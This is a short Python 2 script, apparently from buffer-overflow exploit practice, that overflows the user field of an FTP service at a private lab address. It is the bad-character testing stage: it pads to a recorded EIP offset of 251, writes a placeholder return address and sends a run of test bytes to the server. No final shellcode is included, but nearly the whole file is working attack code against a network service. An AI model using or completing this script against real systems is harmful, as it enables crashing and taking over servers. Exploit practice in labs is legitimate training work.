#!/usr/bin/env python2

import socket

# overflow is in user field and kicks off at a size of 1000
# OFFSETS
# EIP 251
# EXP 263

RHOST = "10.10.10.2"
RPORT = 21

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_length = 1000
eip_offset = 251

shellcode = ""
badchars = [0x00, 0x0A, 0x0D]

for i in range(0x00, 0xFF + 1):
    if i not in badchars:
        shellcode += chr(i)

with open("badchar_test.bin", "wb") as f:
    f.write(shellcode)

padding = "A" * eip_offset
eip = "BBBB"
filler = "C" * 8
esp = "D" * (buf_length - len(padding) - len(eip) - len(filler) - len(shellcode))

buf = padding + eip + filler + shellcode + esp


data = s.recv(1024)
s.send(buf + "\r\n")
data = s.recv(1024)

s.close()

